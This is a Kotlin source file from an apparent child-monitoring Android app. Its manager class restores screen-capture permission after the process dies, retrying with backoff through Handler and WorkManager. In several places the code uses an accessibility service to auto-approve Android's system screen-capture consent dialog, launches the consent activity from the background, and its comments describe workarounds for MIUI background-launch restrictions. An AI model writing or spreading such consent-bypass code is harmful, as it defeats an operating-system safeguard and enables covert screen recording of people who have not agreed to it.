package com.childmonitor.capture

import android.content.Context
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.work.ExistingWorkPolicy
import com.childmonitor.accessibility.ScreenCaptureAutoApprove
import com.childmonitor.debug.PcpFlowLogger
import com.childmonitor.deviceowner.MediaProjectionConsentActivity
import com.childmonitor.oem.OemVendor
import com.childmonitor.sync.MediaProjectionRecoveryTelemetry

/**
 * Orchestrates MediaProjection consent recovery after process death, MIUI kill,
 * low-memory eviction, or [MediaProjection.onStop].
 *
 * ## Recovery chain
 *
 * ```
 * onProjectionUnavailable()
 *   └─► attemptRecovery()
 *         ├─ accessibility ready? ──YES──► launch MediaProjectionConsentActivity
 *         │                                      (accessibility auto-approves system dialog)
 *         │                                ── scheduleRecoveryWatchdog()
 *         └─ accessibility NOT ready? ─────► RECOVERY_DEFERRED
 *                                            MediaProjectionRecoveryWorker.schedule() [WorkManager]
 *                                            (fires after Doze / process restart)
 * ```
 *
 * ## Retry policy
 *
 * Both in-process retries ([Handler.postDelayed]) and out-of-process retries ([WorkManager])
 * share the same attempt counter persisted in [MediaProjectionRecoveryTelemetry]. This
 * prevents double-counting and enforces [MAX_RECOVERY_ATTEMPTS] globally.
 *
 * Backoff: 15 s × 2^(attempt-1) capped at 120 s.
 *
 * ## OEM-specific handling
 *
 * - **MIUI/HyperOS**: BAL restrictions require the 3-layer launcher in [BalSafeActivityLauncher].
 *   When accessibility is not active, [BalSafeActivityLauncher] falls back to a full-screen-intent
 *   notification as a last resort.
 * - **Samsung/OPPO/vivo**: Auto-approve covers OEM dialog variants; no special retry policy.
 * - **Android 14+ (API 34)**: Consent activity starts DATA_SYNC FGS first, then promotes to
 *   MEDIA_PROJECTION after obtaining the token ([ScreenCaptureForegroundService.warmWithFreshConsent]).
 * - **Android 15+ (API 35)**: FGS timeout handled externally; recovery itself is unaffected.
 * - **Android 16 (API 36)**: Single VirtualDisplay per projection enforced by [MediaProjectionCaptureGate];
 *   recovery obtains a new token which resets the gate.
 */
object MediaProjectionRecoveryManager {

    private const val TAG = "MediaProjectionRecovery"

    /** Shared constant so [MediaProjectionRecoveryWorker] can read the budget. */
    const val MAX_RECOVERY_ATTEMPTS = 5
    private const val BASE_RETRY_MS = 15_000L
    private const val MAX_RETRY_MS = 120_000L

    @Volatile
    private var recoveryInFlight = false

    @Volatile
    private var queuedReason: String? = null

    private val mainHandler = Handler(Looper.getMainLooper())

    // ─── Public API ──────────────────────────────────────────────────────────

    /**
     * Attempt MediaProjection recovery. Returns true when the system dialog was launched or
     * queued. Returns false when recovery is not possible right now (not paired, setup in
     * progress, or max attempts exceeded) — in those cases the state is already updated to
     * reflect the new situation.
     *
     * This method is safe to call from any thread.
     */
    @Synchronized
    fun attemptRecovery(context: Context, reason: String): Boolean {
        if (MediaProjectionTokenStore.hasValidToken(context)) return false

        if (com.childmonitor.MonitoringPrefs.isPermissionSetupInProgress(context)) {
            Log.d(TAG, "skip recovery — permission setup wizard in progress reason=$reason")
            return false
        }

        val state = MediaProjectionTokenStore.getConsentState(context)
        if (state == MediaProjectionConsentState.NEVER_GRANTED) {
            Log.d(TAG, "attempt recovery for never-granted consent reason=$reason")
        }

        if (recoveryInFlight) {
            queuedReason = reason
            PcpFlowLogger.log(
                PcpFlowLogger.Category.MEDIA_PROJECTION,
                "recovery queued — in-flight",
                "reason=$reason",
            )
            return true
        }

        val totalAttempts = MediaProjectionRecoveryTelemetry.recoveryAttemptCount(context) + 1
        if (totalAttempts > MAX_RECOVERY_ATTEMPTS) {
            MediaProjectionTokenStore.markRecoveryFailed(context, "max_attempts")
            MediaProjectionRecoveryTelemetry.recordRecoveryOutcome(context, success = false, reason)
            PcpFlowLogger.warn(
                PcpFlowLogger.Category.MEDIA_PROJECTION,
                "recovery exhausted",
                "attempts=$totalAttempts reason=$reason",
            )
            return false
        }

        // ── Accessibility gate ────────────────────────────────────────────────
        if (!ScreenCaptureAutoApprove.isReady(context)) {
            onAccessibilityNotReady(context, reason, totalAttempts)
            return false
        }

        // ── Launch recovery ───────────────────────────────────────────────────
        recoveryInFlight = true
        MediaProjectionTokenStore.markRecoveryPending(context)
        MediaProjectionRecoveryTelemetry.recordRecoveryAttempt(context, reason, totalAttempts)

        val oem = OemVendor.detect()
        PcpFlowLogger.warn(
            PcpFlowLogger.Category.MEDIA_PROJECTION,
            "attempting projection recovery",
            "reason=$reason attempt=$totalAttempts oem=${oem.id}",
        )
        Log.w(TAG, "Attempting MediaProjection recovery reason=$reason attempt=$totalAttempts oem=${oem.id}")

        ScreenCaptureAutoApprove.armForConsent(context.applicationContext, 60_000L)
        launchConsentActivity(context.applicationContext)
        scheduleRecoveryWatchdog(context.applicationContext, reason, totalAttempts)
        return true
    }

    /**
     * Async recovery with a blocking wait — used from stream bootstrap when consent may
     * become available shortly (setup wizard flow).
     */
    fun attemptRecoveryAsync(context: Context, reason: String, timeoutMs: Long = 45_000L): Boolean {
        if (MediaProjectionTokenStore.hasValidToken(context)) return true
        attemptRecovery(context, reason)
        return MediaProjectionConsentHelper.ensureConsent(context.applicationContext, timeoutMs)
    }

    /**
     * Called by [MediaProjectionConsentActivity] when the user approves or dismisses the dialog,
     * and by [scheduleRecoveryWatchdog] on timeout. Thread-safe.
     */
    @Synchronized
    fun onRecoveryComplete(context: Context, success: Boolean, reason: String) {
        recoveryInFlight = false
        MediaProjectionRecoveryTelemetry.recordRecoveryOutcome(context, success, reason)

        if (success) {
            queuedReason = null
            MediaProjectionRecoveryWorker.cancel(context)
            MediaProjectionLossHandler.onProjectionRestored(context.applicationContext)
            return
        }

        val nextReason = queuedReason ?: reason
        queuedReason = null
        val totalAttempts = MediaProjectionRecoveryTelemetry.recoveryAttemptCount(context)

        if (totalAttempts >= MAX_RECOVERY_ATTEMPTS) {
            MediaProjectionTokenStore.markRecoveryFailed(context, reason)
            PcpFlowLogger.warn(
                PcpFlowLogger.Category.MEDIA_PROJECTION,
                "recovery failed — max attempts reached",
                "attempts=$totalAttempts reason=$reason",
            )
            return
        }

        // Schedule in-process retry via Handler (fast path; dies with process).
        val delayMs = backoffMs(totalAttempts)
        PcpFlowLogger.log(
            PcpFlowLogger.Category.MEDIA_PROJECTION,
            "scheduling in-process recovery retry",
            "delayMs=$delayMs reason=$nextReason attempt=${totalAttempts + 1}",
        )
        mainHandler.postDelayed(
            { attemptRecovery(context.applicationContext, nextReason) },
            delayMs,
        )

        // Also schedule a WorkManager job as a process-death-proof fallback.
        // KEEP policy means the WorkManager job won't interrupt if an in-process retry
        // fires first and succeeds — in that case cancel() is called on success.
        MediaProjectionRecoveryWorker.schedule(
            context.applicationContext,
            nextReason,
            attempt = totalAttempts + 1,
            initialDelaySeconds = (delayMs / 1_000L) + 5L,
            policy = ExistingWorkPolicy.KEEP,
        )
    }

    /** @visibleForTesting */
    internal fun resetForTests() {
        recoveryInFlight = false
        queuedReason = null
        mainHandler.removeCallbacksAndMessages(null)
    }

    // ─── Private helpers ─────────────────────────────────────────────────────

    /**
     * Accessibility is not enabled — cannot auto-approve the system dialog.
     *
     * On MIUI, the full-screen-intent fallback in [BalSafeActivityLauncher] may still allow
     * a notification-driven prompt, but auto-approve cannot fire without the service.
     *
     * Transition to [MediaProjectionConsentState.RECOVERY_DEFERRED] and schedule a WorkManager
     * job so recovery re-runs when the process restarts or accessibility is re-enabled.
     */
    private fun onAccessibilityNotReady(context: Context, reason: String, attempt: Int) {
        val oem = OemVendor.detect()
        PcpFlowLogger.warn(
            PcpFlowLogger.Category.MEDIA_PROJECTION,
            "recovery deferred — accessibility not ready",
            "reason=$reason attempt=$attempt oem=${oem.id}",
        )
        Log.w(TAG, "Recovery deferred — accessibility not ready reason=$reason oem=${oem.id}")

        MediaProjectionTokenStore.markRecoveryDeferred(context, "accessibility_unavailable")
        MediaProjectionRecoveryTelemetry.recordRecoveryAttempt(context, "${reason}_deferred", attempt)

        // Schedule WorkManager retry so recovery fires when accessibility is re-enabled
        // or after the app restarts (e.g. after a process death / reboot).
        val backoffSeconds = backoffMs(attempt) / 1_000L
        MediaProjectionRecoveryWorker.schedule(
            context.applicationContext,
            reason,
            attempt,
            initialDelaySeconds = backoffSeconds.coerceAtLeast(15L),
            policy = ExistingWorkPolicy.KEEP,
        )
    }

    private fun launchConsentActivity(context: Context) {
        try {
            MediaProjectionConsentActivity.startFromBackground(context)
        } catch (e: Exception) {
            PcpFlowLogger.error(
                PcpFlowLogger.Category.MEDIA_PROJECTION,
                "consent activity launch failed",
                e,
            )
            onRecoveryComplete(context, success = false, reason = "launch_failed:${e.message}")
        }
    }

    /**
     * Watchdog fires if the user dismisses the dialog, the system kills the activity, or
     * the accessibility service fails to auto-approve within the timeout window.
     *
     * Timeout grows with attempt number to give the user more time on later retries.
     */
    private fun scheduleRecoveryWatchdog(context: Context, reason: String, attempt: Int) {
        val timeoutMs = 45_000L + (attempt * 5_000L)
        mainHandler.postDelayed({
            if (MediaProjectionTokenStore.hasValidToken(context)) {
                onRecoveryComplete(context, success = true, reason)
                return@postDelayed
            }
            val currentState = MediaProjectionTokenStore.getConsentState(context)
            if (currentState != MediaProjectionConsentState.RECOVERY_PENDING) {
                // State changed externally (e.g. consent denied, deferred) — do not double-count.
                return@postDelayed
            }
            Log.w(TAG, "Recovery watchdog timed out reason=$reason attempt=$attempt state=$currentState")
            onRecoveryComplete(context, success = false, reason)
        }, timeoutMs)
    }

    private fun backoffMs(attempt: Int): Long =
        (BASE_RETRY_MS * (1L shl (attempt - 1).coerceAtMost(3))).coerceAtMost(MAX_RETRY_MS)
}
